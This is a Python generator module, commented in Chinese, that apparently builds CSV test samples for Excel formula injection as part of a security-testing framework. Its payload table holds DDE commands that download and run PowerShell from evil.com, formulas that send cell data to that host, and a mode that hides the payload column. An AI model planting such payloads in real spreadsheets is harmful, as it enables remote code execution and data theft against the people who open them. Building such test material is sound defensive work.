# -*- coding: utf-8 -*-
"""
CSV公式注入生成器（PI-043 新增用例的配套工具）。
生成含Excel公式注入的CSV样本，不依赖csv模块，避免对=前缀转义。
依赖：标准库，无第三方依赖。
"""
from .base import MultimodalGenerator, MultimodalSample

# 正常业务数据（脱敏虚构）
CSV_NORMAL_ROWS = [
    ["客户姓名", "账号", "余额", "备注"],
    ["张三", "6222021234567890", "125000.00", "VIP 客户"],
    ["李四", "6222021234567891", "8600.50", "普通客户"],
    ["王五", "6222021234567892", "0.00", "已销户"],
]

# 公式注入载荷库
CSV_FORMULA_PAYLOADS = {
    "cmd":       "=cmd|' /C calc'!A0",
    "dde":       "=cmd|' /C powershell -c \"iwr http://evil.com/x.ps1|iex\"'!A0",
    "hyperlink": '=HYPERLINK("http://evil.com/steal?data="&A1,"点我")',
    "exfil":     '=WEBSERVICE("http://evil.com/collect?d="&B2)',
    "ddespawn":  ("=cmd|' /C powershell -NoP -NonI -W Hidden -Exec Bypass "
                  "-c \"IEX(New-Object Net.WebClient).DownloadString("
                  "'http://evil.com/x.ps1')\"'!A0"),
}


class CSVGenerator(MultimodalGenerator):
    modality = "csv"

    modes = {
        "formula": {
            "desc": "每行末尾追加公式载荷",
            "dangerous": True,
        },
        "row": {
            "desc": "仅第 2 行注入公式载荷",
            "dangerous": True,
        },
        "hidden": {
            "desc": "隐藏列（列名带前导空格）注入公式载荷",
            "dangerous": True,
        },
        "normal": {
            "desc": "对照组，仅正常业务数据",
            "dangerous": False,
        },
    }

    def generate(self, payload, mode, out_path, **kwargs):
        # type: (str, str, str, **Any) -> MultimodalSample
        if mode not in self.modes:
            raise ValueError("未知 CSV 注入模式：%s（可选：%s）"
                             % (mode, ", ".join(self.modes.keys())))
        payload_key = kwargs.get("payload_key", "cmd")
        if payload_key not in CSV_FORMULA_PAYLOADS:
            raise ValueError("未知载荷类型：%s（可选：%s）"
                             % (payload_key, ", ".join(CSV_FORMULA_PAYLOADS.keys())))
        path = make_injection_csv(
            mode=mode, payload_key=payload_key, out_path=out_path,
            custom_payload=payload or None,
        )
        return MultimodalSample(
            modality=self.modality,
            path=path,
            payload=payload or CSV_FORMULA_PAYLOADS[payload_key],
            mode=mode,
            metadata={"payload_key": payload_key},
        )


def make_injection_csv(mode="formula", payload_key="cmd",
                       out_path="sample.csv", custom_payload=None):
    """
    生成含公式注入的 CSV 样本。
    mode:
      - formula 每行末尾追加载荷
      - row     仅第 2 行注入
      - hidden  隐藏列注入
      - normal  对照组
    payload_key: cmd / dde / hyperlink / exfil / ddespawn
    custom_payload: 若非空，覆盖 payload_key 的默认载荷
    """
    if mode not in CSVGenerator.modes:
        raise ValueError("未知 CSV 注入模式：%s" % mode)
    if payload_key not in CSV_FORMULA_PAYLOADS:
        raise ValueError("未知载荷类型：%s" % payload_key)

    payload = custom_payload or CSV_FORMULA_PAYLOADS[payload_key]
    rows = [list(r) for r in CSV_NORMAL_ROWS]

    if mode == "normal":
        pass
    elif mode == "formula":
        rows[0].append("备注2")
        for i in range(1, len(rows)):
            rows[i].append(payload)
    elif mode == "row":
        for i in range(1, len(rows)):
            rows[i].append("" if i != 2 else payload)
    elif mode == "hidden":
        rows[0].append("  内部字段")   # 列名带前导空格，低调
        for i in range(1, len(rows)):
            rows[i].append(payload)

    with open(out_path, "w", encoding="utf-8-sig", newline="") as f:
        for row in rows:
            fields = []
            for cell in row:
                s = str(cell)
                # 只有含逗号/引号/换行的字段才用引号包裹，避免 = 前缀被破坏
                if any(ch in s for ch in [",", '"', "\n", "\r"]):
                    s = '"' + s.replace('"', '""') + '"'
                fields.append(s)
            f.write(",".join(fields) + "\r\n")
    return out_path